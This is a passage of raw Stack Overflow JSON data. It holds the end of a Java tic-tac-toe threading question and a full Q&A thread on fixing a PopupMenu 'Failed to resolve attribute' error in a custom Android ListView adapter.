printBoard(){\n        // todo change to ui components\n        for (int i = 0  ; i &lt; boardSize ; i++)\n        {\n            for (int j = 0  ; j &lt; boardSize ; j++)\n            {\n                System.out.print(&quot;|&quot;);\n                System.out.print(&quot; &quot; + getSign(board_values[i][j])+ &quot; &quot;);\n                System.out.print(&quot;|&quot;);\n            }\n            System.out.println(&quot;&quot;);\n            System.out.println(&quot;----------------------------------&quot; );\n        }\n    }\n\n\n    /** is this the Synchronized one ?  */\n    public  boolean makeMove(Player player , int x , int y ) {\n\n            /*Update Board Value\n            insert 1 in the 2d board at x,y for player 1\n            insert 2 in the 2d board at x,y for player 2\n            */\n            int sign = player.getSign();\n\n            updateBoard(x,y , sign ) ;\n\n            /*print Board*/\n            printBoard();\n\n            /* check for winner */\n             doWeHaveAwinner(x,y , sign);\n\n        return  true ;\n    }\n\n    /*check the whole row (x)  for if  all signs are equals\n    , checks the whole column (x) for if  all signs are equals\n    check diagonal  if x=y */\n    private boolean doWeHaveAwinner(int x, int y, int sign) {\n        // TODO: 16/01/2022\n        return false ;\n\n    }\n\n    private void updateBoard(int x, int y , int sign ) {\n        board_values[x][y] = sign ;\n    }\n\n\n    public boolean isPositionAvalabile(int x , int y ){\n        return !(x&gt;this.boardSize ||  x &lt; 0  || y&gt;this.boardSize || y &lt; 0) ;\n    }\n\n    private void checkMove() {\n        // todo &gt; ?\n    }\n    private void resetBoard(){\n        // todo set al values to 0\n\n    }\n    private void updateResultHistory(){\n        // TODO: 16/01/2022 update &lt;Winner Name , Ps+1 &gt;\n    }\n\n\n    private int ScanInt(){\n        Scanner scan = new Scanner(System.in);\n        System.out.print(&quot;Enter any number: &quot;);\n\n        // This method reads the number provided using keyboard\n        int num = scan.nextInt();\n\n        // Closing Scanner after the use\n        return  num;\n    }\n\n    /*Get Set*/\n    public synchronized boolean isGameOver() {\n        return gameOver;\n    }\n\n    public void setGameOver(boolean gameOver) {\n        this.gameOver = gameOver;\n    }\n\n    public int getCurrentPlayerTurn() {\n        return currentPlayerTurn;\n    }\n\n    public void setCurrentPlayerTurn(int currentPlayerTurn) {\n        this.currentPlayerTurn = currentPlayerTurn;\n    }\n}\n</code></pre>\n<p>And here is Game.java, it basically inits 2 players.</p>\n<p>Notice that in each player init I passed the board instance as a parameter.</p>\n<p>It might a look little bit messy but I think passing the board instance for the players is the important thing here. Also I called the player1().start and player2.start()</p>\n<p>Game.java</p>\n<pre><code>public class Game  {\n    private Player player1 ;\n    private Player player2 ;\n    private Board board ;\n\n    private void initBoard(){\n        /* request board size */\n        int board_size = requestBoardSize();\n        board = new Board(board_size); // Synchronized class fields ?\n    }\n\n    private  void initGameMode(){\n        /*\n        init the players  objects as follows\n        1 - for human-machine game\n        2 - for machine-human game, and\n        3 - for human-human game\n        */\n\n        System.out.println(Utils.str_gameType);\n        Scanner scanner  = new Scanner( System.in);\n        int game_mode = scanner.nextInt( );\n\n        switch (game_mode) {\n            case 1:\n                /* init game type1  human-machine Game*/\n                player1 = new HumanPlayer(board);\n                player2 = new MachinePlayer(board);\n\n                break;\n            case 2:\n                player1 = new MachinePlayer(board);\n                player2 = new HumanPlayer(board);\n                break;\n            case 3:\n                player1 = new HumanPlayer(board);\n                player2 = new HumanPlayer(board);\n                break;\n\n            default:\n                throw new IllegalStateException(&quot;Unexpected value: &quot; + game_mode);\n\n        }\n\n        player1.setSign(1);\n        player2.setSign(2);\n        System.out.println(&quot;&quot;);\n    }\n\n    private void initPlayersName(){\n        /*request name player 1  */\n        System.out.println(Utils.str_player1Name); /*Scan first name*/\n        Scanner scan1 = new Scanner(System.in);\n        String name1 = scan1.next();\n        player1.setPlayerName(name1);\n\n\n        /*request name player 2  */\n        System.out.println(Utils.str_player2Name); /*Scan first name*/\n        Scanner scan2 = new Scanner(System.in);\n        String name2 = scan2.next();\n        player2.setPlayerName(name2);\n\n\n\n    }\n\n    public Game() {\n        System.out.println(Utils.str_start_game);\n        initBoard();\n        initGameMode();\n        initPlayersName();\n    }\n\n    public void start() {\n        // todo change who starts first\n        player1.start();\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    Thread.sleep(300);\n                    player2.start();\n                }catch (Exception e)\n                {\n\n                }\n            }\n        }).start();\n\n\n    }\n\n    private int requestBoardSize() {\n        System.out.println(Utils.str_request_board_size);\n        Scanner scanner = new Scanner(System.in) ;\n        int i =  scanner.nextInt() ;\n        return i ;\n\n    }\n    \n}///End of Class\n</code></pre>\n"},{"tags":["java","android","listview","android-adapter","runtimeexception"],"comments":[{"owner":{"account_id":7786785,"reputation":459,"user_id":5891294,"accept_rate":50,"display_name":"shiv"},"score":0,"creation_date":1461072080,"post_id":27782846,"comment_id":61024469,"body_markdown":"http://stackoverflow.com/questions/36712824/i-want-a-popup-menu-when-i-click-on-my-listview-item?noredirect=1#comment61012148_36712824","body":"<a href=\"http://stackoverflow.com/questions/36712824/i-want-a-popup-menu-when-i-click-on-my-listview-item?noredirect=1#comment61012148_36712824\" title=\"i want a popup menu when i click on my listview item\">stackoverflow.com/questions/36712824/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":3159987,"reputation":3983,"user_id":2675569,"accept_rate":86,"display_name":"Rick"},"down_vote_count":0,"up_vote_count":6,"is_accepted":false,"score":6,"last_activity_date":1420572045,"creation_date":1420476557,"answer_id":27784092,"question_id":27782846,"body_markdown":"First create a `button` in your _custom-item-listview.xml_ and then add the code below:\r\n\r\n`Button`:\r\n\r\n    &lt;Button\r\n    android:layout_width=&quot;wrap_content&quot;\r\n    android:layout_height=&quot;wrap_content&quot;\r\n    android:text=&quot;@string/button_text&quot;\r\n    android:id=&quot;@+id/button1&quot;\r\n    ... /&gt;\r\n\r\n\r\nclass:\r\n\r\n    public class CustomAdapter extends ArrayAdapter&lt;CustomItem&gt; {\r\n   \r\n        private static Activity context = null;\r\n        private final ArrayList&lt;CustomItem&gt; mItemsArrayList;\r\n        private CustomFragment mFragment;\r\n   \r\n   \r\n        public CustomAdapter(Activity context, ArrayList&lt;CustomItem&gt; itemsArrayList, CustomFragment fragment) {\r\n   \r\n            super(context, R.layout.watch_list_row, itemsArrayList);\r\n   \r\n            CustomAdapter.context = context;\r\n            this.mItemsArrayList = itemsArrayList;\r\n            this.mFragment = fragment;\r\n        }\r\n   \r\n        @Override\r\n        public View getView(int position, View convertView, ViewGroup parent) {\r\n            final int pos = position;\r\n            LayoutInflater inflater = (LayoutInflater) context\r\n                    .getSystemService(Context.LAYOUT_INFLATER_SERVICE);\r\n   \r\n            final View rowView = inflater.inflate(R.layout.watch_list_row, parent, false);\r\n        final Button popUp_btn = (Button)rowView.findViewById(R.id.button1);\r\n        popUp_btn.setOnClickListener(new View.OnClickListener() {\r\n\r\n            @Override\r\n            public void onClick(View v) {\r\n                final PopupMenu popup = new PopupMenu(context, popUp_btn);\r\n                popup.getMenuInflater().inflate(R.menu.context_menu, popup.getMenu());\r\n                popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\r\n                    public boolean onMenuItemClick(MenuItem item) {\r\n                        int i = item.getItemId();\r\n                        if (i == R.id.item1) {\r\n                            //do something\r\n                            return true;\r\n                        }\r\n                        else if (i == R.id.item2){\r\n                            //do something\r\n                            return true;\r\n                        }\r\n                        else if (i == R.id.item3) {\r\n                            //do something\r\n                            return true;\r\n                        }\r\n                        else {\r\n                            return onMenuItemClick(item);\r\n                        }\r\n                    }\r\n                });\r\n\r\n                popup.show();\r\n\r\n\r\n**EDIT:**\r\nThis works well for me:\r\n\r\n`TAB1`\r\n\r\n    public  class TAB1 extends Fragment {\r\n    View view;\r\n\r\n    public TAB1() {\r\n    }\r\n\r\n    @Override\r\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\r\n                             Bundle savedInstanceState) {\r\n        view = inflater.inflate(R.layout.tab1, null);\r\n\r\n\r\n                ListView list = (ListView) view.findViewById(android.R.id.list);\r\n                CustomList adapter = new CustomList(getActivity());\r\n                adapter.addAll();\r\n                list.setAdapter(adapter);\r\n      \r\n\r\n        return view;\r\n    }\r\n\r\n    \r\n`CustomList`:\r\n\r\n    public class CustomList extends ArrayAdapter&lt;YourArrayAdapter&gt; {\r\n\r\n    private static Activity context = null;\r\n\r\n    public CustomList(Activity context) {\r\n        super(context, R.layout.custom_listview, web);\r\n        CustomList.context = context;\r\n    }\r\n    @Override\r\n    public View getView(final int position, View view, ViewGroup parent) {\r\n        LayoutInflater inflater = context.getLayoutInflater();\r\n        final View rowView = inflater.inflate(R.layout.custom_listview, null, true);\r\n        \r\n        //your stuff here\r\n\r\n        final Button popUp_btn = (Button)rowView.findViewById(R.id.button1);\r\n        popUp_btn.setOnClickListener(new View.OnClickListener() {\r\n\r\n            @Override\r\n            public void onClick(View v) {\r\n                final PopupMenu popup = new PopupMenu(context, popUp_btn);\r\n                popup.getMenuInflater().inflate(R.menu.context_menu, popup.getMenu());\r\n                popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\r\n                    public boolean onMenuItemClick(MenuItem item) {\r\n                        int i = item.getItemId();\r\n                        if (i == R.id.item1) {\r\n                            //do something\r\n                            return true;\r\n                        }\r\n                        else if (i == R.id.item2){\r\n                            //do something\r\n                            return true;\r\n                        }\r\n                        else if (i == R.id.item3) {\r\n                            //do something\r\n                            return true;\r\n                        }\r\n                        else {\r\n                            return onMenuItemClick(item);\r\n                        }\r\n                    }\r\n                });\r\n\r\n                popup.show();\r\n\r\n            }\r\n        });\r\n\r\n        return rowView;\r\n\r\n    }\r\n\r\n\r\n\r\n            ","title":"Popup Menu in custom ListView","body":"<p>First create a <code>button</code> in your <em>custom-item-listview.xml</em> and then add the code below:</p>\n\n<p><code>Button</code>:</p>\n\n<pre><code>&lt;Button\nandroid:layout_width=\"wrap_content\"\nandroid:layout_height=\"wrap_content\"\nandroid:text=\"@string/button_text\"\nandroid:id=\"@+id/button1\"\n... /&gt;\n</code></pre>\n\n<p>class:</p>\n\n<pre><code>public class CustomAdapter extends ArrayAdapter&lt;CustomItem&gt; {\n\n    private static Activity context = null;\n    private final ArrayList&lt;CustomItem&gt; mItemsArrayList;\n    private CustomFragment mFragment;\n\n\n    public CustomAdapter(Activity context, ArrayList&lt;CustomItem&gt; itemsArrayList, CustomFragment fragment) {\n\n        super(context, R.layout.watch_list_row, itemsArrayList);\n\n        CustomAdapter.context = context;\n        this.mItemsArrayList = itemsArrayList;\n        this.mFragment = fragment;\n    }\n\n    @Override\n    public View getView(int position, View convertView, ViewGroup parent) {\n        final int pos = position;\n        LayoutInflater inflater = (LayoutInflater) context\n                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n\n        final View rowView = inflater.inflate(R.layout.watch_list_row, parent, false);\n    final Button popUp_btn = (Button)rowView.findViewById(R.id.button1);\n    popUp_btn.setOnClickListener(new View.OnClickListener() {\n\n        @Override\n        public void onClick(View v) {\n            final PopupMenu popup = new PopupMenu(context, popUp_btn);\n            popup.getMenuInflater().inflate(R.menu.context_menu, popup.getMenu());\n            popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\n                public boolean onMenuItemClick(MenuItem item) {\n                    int i = item.getItemId();\n                    if (i == R.id.item1) {\n                        //do something\n                        return true;\n                    }\n                    else if (i == R.id.item2){\n                        //do something\n                        return true;\n                    }\n                    else if (i == R.id.item3) {\n                        //do something\n                        return true;\n                    }\n                    else {\n                        return onMenuItemClick(item);\n                    }\n                }\n            });\n\n            popup.show();\n</code></pre>\n\n<p><strong>EDIT:</strong>\nThis works well for me:</p>\n\n<p><code>TAB1</code></p>\n\n<pre><code>public  class TAB1 extends Fragment {\nView view;\n\npublic TAB1() {\n}\n\n@Override\npublic View onCreateView(LayoutInflater inflater, ViewGroup container,\n                         Bundle savedInstanceState) {\n    view = inflater.inflate(R.layout.tab1, null);\n\n\n            ListView list = (ListView) view.findViewById(android.R.id.list);\n            CustomList adapter = new CustomList(getActivity());\n            adapter.addAll();\n            list.setAdapter(adapter);\n\n\n    return view;\n}\n</code></pre>\n\n<p><code>CustomList</code>:</p>\n\n<pre><code>public class CustomList extends ArrayAdapter&lt;YourArrayAdapter&gt; {\n\nprivate static Activity context = null;\n\npublic CustomList(Activity context) {\n    super(context, R.layout.custom_listview, web);\n    CustomList.context = context;\n}\n@Override\npublic View getView(final int position, View view, ViewGroup parent) {\n    LayoutInflater inflater = context.getLayoutInflater();\n    final View rowView = inflater.inflate(R.layout.custom_listview, null, true);\n\n    //your stuff here\n\n    final Button popUp_btn = (Button)rowView.findViewById(R.id.button1);\n    popUp_btn.setOnClickListener(new View.OnClickListener() {\n\n        @Override\n        public void onClick(View v) {\n            final PopupMenu popup = new PopupMenu(context, popUp_btn);\n            popup.getMenuInflater().inflate(R.menu.context_menu, popup.getMenu());\n            popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\n                public boolean onMenuItemClick(MenuItem item) {\n                    int i = item.getItemId();\n                    if (i == R.id.item1) {\n                        //do something\n                        return true;\n                    }\n                    else if (i == R.id.item2){\n                        //do something\n                        return true;\n                    }\n                    else if (i == R.id.item3) {\n                        //do something\n                        return true;\n                    }\n                    else {\n                        return onMenuItemClick(item);\n                    }\n                }\n            });\n\n            popup.show();\n\n        }\n    });\n\n    return rowView;\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5588566,"reputation":11,"user_id":4428481,"display_name":"Philippe"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1420628564,"creation_date":1420628564,"answer_id":27817979,"question_id":27782846,"body_markdown":"I&#39;ve just had the same issue when I modified the theme parent style:\r\nfrom\r\n\r\n    &lt;style name=&quot;MainAppTheme&quot; parent=&quot;@style/Theme.AppCompat.Light&quot;&gt;\r\n\r\nto\r\n\r\n    &lt;style name=&quot;MainAppTheme&quot; parent=&quot;@style/Theme.Base.AppCompat.Light&quot;&gt;\r\n\r\nMaybe your app uses the Theme.Base style, which does not define the required 6th parameter used by PopupMenu. From SO question [How to use ActionBarActivity with Theme.Material][1], Theme.AppCompat extends Theme.Base.AppCompat\r\n\r\n  [1]: https://stackoverflow.com/questions/24545394/how-to-use-actionbaractivity-with-theme-material","title":"Popup Menu in custom ListView","body":"<p>I've just had the same issue when I modified the theme parent style:\nfrom</p>\n\n<pre><code>&lt;style name=\"MainAppTheme\" parent=\"@style/Theme.AppCompat.Light\"&gt;\n</code></pre>\n\n<p>to</p>\n\n<pre><code>&lt;style name=\"MainAppTheme\" parent=\"@style/Theme.Base.AppCompat.Light\"&gt;\n</code></pre>\n\n<p>Maybe your app uses the Theme.Base style, which does not define the required 6th parameter used by PopupMenu. From SO question <a href=\"https://stackoverflow.com/questions/24545394/how-to-use-actionbaractivity-with-theme-material\">How to use ActionBarActivity with Theme.Material</a>, Theme.AppCompat extends Theme.Base.AppCompat</p>\n"},{"tags":[],"owner":{"account_id":3241330,"reputation":927,"user_id":2734302,"accept_rate":71,"display_name":"Al0x"},"down_vote_count":0,"up_vote_count":39,"is_accepted":true,"score":39,"last_activity_date":1420657176,"creation_date":1420657176,"answer_id":27826670,"question_id":27782846,"body_markdown":"I finally found the solution to my problem, eventhough I have no explanation why this solution works.\r\n\r\nWith the following import I always had the error:\r\n\r\n    import android.support.v7.widget.PopupMenu;\r\n\r\nIt works fine with the following import:\r\n\r\n    import android.widget.PopupMenu;\r\n\r\n\r\nI tested the code provided by Ric (Thanks for the great help!) and my own. Both are working now. Maybe someone has an explanation why the import matters in this case.","title":"Popup Menu in custom ListView","body":"<p>I finally found the solution to my problem, eventhough I have no explanation why this solution works.</p>\n\n<p>With the following import I always had the error:</p>\n\n<pre><code>import android.support.v7.widget.PopupMenu;\n</code></pre>\n\n<p>It works fine with the following import:</p>\n\n<pre><code>import android.widget.PopupMenu;\n</code></pre>\n\n<p>I tested the code provided by Ric (Thanks for the great help!) and my own. Both are working now. Maybe someone has an explanation why the import matters in this case.</p>\n"},{"tags":[],"owner":{"account_id":4600407,"reputation":98,"user_id":3731316,"display_name":"mlopezv86"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1465467808,"creation_date":1465467808,"answer_id":37723289,"question_id":27782846,"body_markdown":"I fixed a similar error just by passing as parameter a static activity. For example:\r\n\r\n    static AppCompatActivity sActivity;\r\n\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        super.onCreate(savedInstanceState);\r\n\r\n        sActivity = this;\r\n\r\n    yourLayout.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View v) {\r\n\t        PopupMenu popup = new PopupMenu(sActivity, v);\r\n            MenuInflater inflater = popup.getMenuInflater();\r\n            inflater.inflate(R.menu.my_popup_menu, popup.getMenu());\r\n\t        popup.show();\r\n            }\r\n       });\r\n    }\r\n\r\nAlso, you problem might be this one: [Issue 152141][1]\r\n\r\nHopefully it will help you, respecting the `android.support.v7.widget.PopupMenu` import.\r\n\r\nRegards.\r\n\r\n\r\n  [1]: https://code.google.com/p/android/issues/detail?id=152141","title":"Popup Menu in custom ListView","body":"<p>I fixed a similar error just by passing as parameter a static activity. For example:</p>\n\n<pre><code>static AppCompatActivity sActivity;\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n\n    sActivity = this;\n\nyourLayout.setOnClickListener(new View.OnClickListener() {\n        @Override\n        public void onClick(View v) {\n        PopupMenu popup = new PopupMenu(sActivity, v);\n        MenuInflater inflater = popup.getMenuInflater();\n        inflater.inflate(R.menu.my_popup_menu, popup.getMenu());\n        popup.show();\n        }\n   });\n}\n</code></pre>\n\n<p>Also, you problem might be this one: <a href=\"https://code.google.com/p/android/issues/detail?id=152141\" rel=\"nofollow\">Issue 152141</a></p>\n\n<p>Hopefully it will help you, respecting the <code>android.support.v7.widget.PopupMenu</code> import.</p>\n\n<p>Regards.</p>\n"},{"tags":[],"owner":{"account_id":5739154,"reputation":1530,"user_id":4532349,"display_name":"Uzair"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1465899479,"creation_date":1465899479,"answer_id":37809223,"question_id":27782846,"body_markdown":"use **this** as(activity context)*not* application context or context\r\n\r\n         PopupMenu popup = new PopupMenu(this, v);\r\n","title":"Popup Menu in custom ListView","body":"<p>use <strong>this</strong> as(activity context)<em>not</em> application context or context</p>\n\n<pre><code>     PopupMenu popup = new PopupMenu(this, v);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":8738664,"reputation":281,"user_id":6536369,"display_name":"Karthick"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1486734901,"creation_date":1475143264,"answer_id":39767219,"question_id":27782846,"body_markdown":"        popup = (Button)findViewById(R.id.button);\r\n\r\n        popup.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View view) {\r\n                PopupMenu popup = new PopupMenu(MainActivity.this,view);\r\n                popup.getMenuInflater().inflate(R.menu.popup_menu,popup.getMenu());\r\n                popup.show();\r\n                popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\r\n                    @Override\r\n                    public boolean onMenuItemClick(MenuItem item) {\r\n                        int id = item.getItemId();\r\n                        if(id==R.id.install){\r\n                            show_toast(&quot;Install Clicked&quot;);\r\n                        }else{\r\n                            show_toast(&quot;WishList Clicked&quot;);                            \r\n                        }\r\n                        return true;\r\n                    }\r\n                });\r\n            }\r\n        });\r\n\r\n \r\n\r\n        public void show_toast(String message){\r\n            Toast.makeText(this,message,Toast.LENGTH_SHORT).show();\r\n        }\r\n\r\nNote:&lt;br/&gt;\r\n    Don&#39;t forgot to import this....\r\n\r\n    import android.support.v7.widget.PopupMenu;\r\n    import android.view.MenuItem;","title":"Popup Menu in custom ListView","body":"<pre><code>    popup = (Button)findViewById(R.id.button);\n\n    popup.setOnClickListener(new View.OnClickListener() {\n        @Override\n        public void onClick(View view) {\n            PopupMenu popup = new PopupMenu(MainActivity.this,view);\n            popup.getMenuInflater().inflate(R.menu.popup_menu,popup.getMenu());\n            popup.show();\n            popup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\n                @Override\n                public boolean onMenuItemClick(MenuItem item) {\n                    int id = item.getItemId();\n                    if(id==R.id.install){\n                        show_toast(\"Install Clicked\");\n                    }else{\n                        show_toast(\"WishList Clicked\");                            \n                    }\n                    return true;\n                }\n            });\n        }\n    });\n\n\n\n    public void show_toast(String message){\n        Toast.makeText(this,message,Toast.LENGTH_SHORT).show();\n    }\n</code></pre>\n\n<p>Note:<br/>\n    Don't forgot to import this....</p>\n\n<pre><code>import android.support.v7.widget.PopupMenu;\nimport android.view.MenuItem;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4752630,"reputation":2153,"user_id":3842263,"display_name":"Yosidroid"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1489078686,"creation_date":1489072966,"answer_id":42699107,"question_id":27782846,"body_markdown":"Rick&#39;s code of lines works perfect as long as you import the following:  \r\n\r\n    import android.widget.PopupMenu;\r\nNot the one below:  \r\n\r\n    import android.support.v7.widget.PopupMenu;\r\n","title":"Popup Menu in custom ListView","body":"<p>Rick's code of lines works perfect as long as you import the following:  </p>\n\n<pre><code>import android.widget.PopupMenu;\n</code></pre>\n\n<p>Not the one below:  </p>\n\n<pre><code>import android.support.v7.widget.PopupMenu;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":21166897,"reputation":1,"user_id":15564034,"display_name":"Medrick Meshack"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642494678,"creation_date":1642494678,"answer_id":70752446,"question_id":27782846,"body_markdown":"Firstly required to import  \r\nimport android.widget.PopupMenu;\r\n\r\nAnd your it must be look like this\r\n\r\n   \r\n\r\n    holder.dayDate.setOnClickListener(new View.OnClickListener() {\r\n                @Override\r\n                public void onClick(View v) {\r\n                    PopupMenu popupMenu = new PopupMenu(context, holder.dayDate);\r\n                    popupMenu.getMenu().add(&quot;Futa&quot;);\r\n                    popupMenu.getMenu().add(&quot;Acha&quot;);\r\n                    popupMenu.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\r\n                        @Override\r\n                        public boolean onMenuItemClick(MenuItem item) {\r\n                            switch (item.getTitle().toString()) {\r\n                                case &quot;View&quot; :\r\n                                    Toast.makeText(context, &quot;Bidhaa imefutwa.&quot;, Toast.LENGTH_SHORT).show();\r\n                                    break;\r\n                                case &quot;Edit&quot;:\r\n    //                                popupMenu.dismiss();\r\n                                    break;\r\n                            }\r\n                            return false;\r\n                        }\r\n                    });\r\n                    popupMenu.show();\r\n                }\r\n            });\r\n    \r\n        }","title":"Popup Menu in custom ListView","body":"<p>Firstly required to import<br />\nimport android.widget.PopupMenu;</p>\n<p>And your it must be look like this</p>\n<pre><code>holder.dayDate.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                PopupMenu popupMenu = new PopupMenu(context, holder.dayDate);\n                popupMenu.getMenu().add(&quot;Futa&quot;);\n                popupMenu.getMenu().add(&quot;Acha&quot;);\n                popupMenu.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\n                    @Override\n                    public boolean onMenuItemClick(MenuItem item) {\n                        switch (item.getTitle().toString()) {\n                            case &quot;View&quot; :\n                                Toast.makeText(context, &quot;Bidhaa imefutwa.&quot;, Toast.LENGTH_SHORT).show();\n                                break;\n                            case &quot;Edit&quot;:\n//                                popupMenu.dismiss();\n                                break;\n                        }\n                        return false;\n                    }\n                });\n                popupMenu.show();\n            }\n        });\n\n    }\n</code></pre>\n"}],"owner":{"account_id":3241330,"reputation":927,"user_id":2734302,"accept_rate":71,"display_name":"Al0x"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":28053,"favorite_count":0,"down_vote_count":0,"up_vote_count":12,"accepted_answer_id":27826670,"answer_count":8,"score":12,"last_activity_date":1642494678,"creation_date":1420472488,"question_id":27782846,"body_markdown":"What I want to achieve:\r\n\r\nI have a custom ListView adapter. To each Listitem I want to add a popup menu, pretty similar to the ListView in the current Google Play application.\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/asFdW.png\r\n  ![Screenshot of Google Play items][1]\r\n\r\n\r\nThis is what I tried:\r\nMost of my code comes from this Android sample *samples\\android-19\\ui\\ActionBarCompat-ListPopupMenu*\r\n\r\n\r\n**CustomFragmentPageAdapter.java**:\r\n\r\n    // create new fragment\r\n    mCustomFragment = CustomFragment.newInstance(position);\r\n\r\n\r\n**CustomFragment.java**\r\n\r\n    public class CustomFragment extends ListFragment implements View.OnClickListener{\r\n\r\n    ...\r\n\r\n    @Override\r\n    public void onClick(final View v) {\r\n        v.post(new Runnable() {\r\n            @Override\r\n            public void run() {\r\n                showPopupMenu(v);\r\n            }\r\n        });\r\n    }\r\n\r\n    private void showPopupMenu(View view) {\r\n    \r\n        PopupMenu popup = new PopupMenu(getActivity(), view);\r\n\r\n        popup.getMenuInflater().inflate(R.menu.popup_menu, popup.getMenu());\r\n\r\n        popup.show();\r\n    }\r\n\r\n**CustomArrayAdapter**:\r\n\r\n    public class CustomAdapter extends ArrayAdapter&lt;WatchListPlayerItem&gt; {\r\n        ...    \r\n        @Override\r\n        public View getView(int position, View convertView, ViewGroup parent) {\r\n            final int pos = position;\r\n     \r\n            LayoutInflater inflater = (LayoutInflater) context\r\n                    .getSystemService(Context.LAYOUT_INFLATER_SERVICE);\r\n    \r\n            final View rowView = inflater.inflate(R.layout.watch_list_row, parent, false);\r\n\r\n            View popupButton = rowView.findViewById(R.id.imgPopUp);\r\n    \r\n            popupButton.setTag(getItem(position));\r\n    \r\n            popupButton.setOnClickListener(mFragment);\r\n    \r\n            return rowView;\r\n        }\r\n    }\r\n\r\n**popup_menu.xml**:\r\n\r\n    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\r\n    &lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;\r\n        &lt;item\r\n            android:id=&quot;@+id/install&quot;\r\n            android:title=&quot;Install&quot; /&gt;\r\n        &lt;item\r\n            android:id=&quot;@+id/addtowishlist&quot;\r\n            android:title=&quot;Add to wishlist&quot; /&gt;\r\n    &lt;/menu&gt;\r\n\r\n**Logcat output**:\r\n\r\n    java.lang.RuntimeException: Failed to resolve attribute at index 6\r\n                at android.content.res.TypedArray.getLayoutDimension(TypedArray.java:603)\r\n                at android.view.ViewGroup$LayoutParams.setBaseAttributes(ViewGroup.java:6423)\r\n                at android.view.ViewGroup$MarginLayoutParams.&lt;init&gt;(ViewGroup.java:6591)\r\n                at android.widget.FrameLayout$LayoutParams.&lt;init&gt;(FrameLayout.java:735)\r\n    ...\r\n\r\nThe error is thrown at popup.show() in my CustomFragment.\r\n\r\nThis error is clearly driving me crazy and ANY help to solve this issue is highly appreciated!","title":"Popup Menu in custom ListView","body":"<p>What I want to achieve:</p>\n\n<p>I have a custom ListView adapter. To each Listitem I want to add a popup menu, pretty similar to the ListView in the current Google Play application.</p>\n\n<p><img src=\"https://i.stack.imgur.com/asFdW.png\" alt=\"Screenshot of Google Play items\"></p>\n\n<p>This is what I tried:\nMost of my code comes from this Android sample <em>samples\\android-19\\ui\\ActionBarCompat-ListPopupMenu</em></p>\n\n<p><strong>CustomFragmentPageAdapter.java</strong>:</p>\n\n<pre><code>// create new fragment\nmCustomFragment = CustomFragment.newInstance(position);\n</code></pre>\n\n<p><strong>CustomFragment.java</strong></p>\n\n<pre><code>public class CustomFragment extends ListFragment implements View.OnClickListener{\n\n...\n\n@Override\npublic void onClick(final View v) {\n    v.post(new Runnable() {\n        @Override\n        public void run() {\n            showPopupMenu(v);\n        }\n    });\n}\n\nprivate void showPopupMenu(View view) {\n\n    PopupMenu popup = new PopupMenu(getActivity(), view);\n\n    popup.getMenuInflater().inflate(R.menu.popup_menu, popup.getMenu());\n\n    popup.show();\n}\n</code></pre>\n\n<p><strong>CustomArrayAdapter</strong>:</p>\n\n<pre><code>public class CustomAdapter extends ArrayAdapter&lt;WatchListPlayerItem&gt; {\n    ...    \n    @Override\n    public View getView(int position, View convertView, ViewGroup parent) {\n        final int pos = position;\n\n        LayoutInflater inflater = (LayoutInflater) context\n                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n\n        final View rowView = inflater.inflate(R.layout.watch_list_row, parent, false);\n\n        View popupButton = rowView.findViewById(R.id.imgPopUp);\n\n        popupButton.setTag(getItem(position));\n\n        popupButton.setOnClickListener(mFragment);\n\n        return rowView;\n    }\n}\n</code></pre>\n\n<p><strong>popup_menu.xml</strong>:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;menu xmlns:android=\"http://schemas.android.com/apk/res/android\"&gt;\n    &lt;item\n        android:id=\"@+id/install\"\n        android:title=\"Install\" /&gt;\n    &lt;item\n        android:id=\"@+id/addtowishlist\"\n        android:title=\"Add to wishlist\" /&gt;\n&lt;/menu&gt;\n</code></pre>\n\n<p><strong>Logcat output</strong>:</p>\n\n<pre><code>java.lang.RuntimeException: Failed to resolve attribute at index 6\n            at android.content.res.TypedArray.getLayoutDimension(TypedArray.java:603)\n            at android.view.ViewGroup$LayoutParams.setBaseAttributes(ViewGroup.java:6423)\n            at android.view.ViewGroup$MarginLayoutParams.&lt;init&gt;(ViewGroup.java:6591)\n            at android.widget.FrameLayout$LayoutParams.&lt;init&gt;(FrameLayout.java:735)\n...\n</code></pre>\n\n<p>The error is thrown at popup.show() in my CustomFragment.</p>\n\n<p>This error is clearly driving me crazy and ANY help to solve this issue is highly 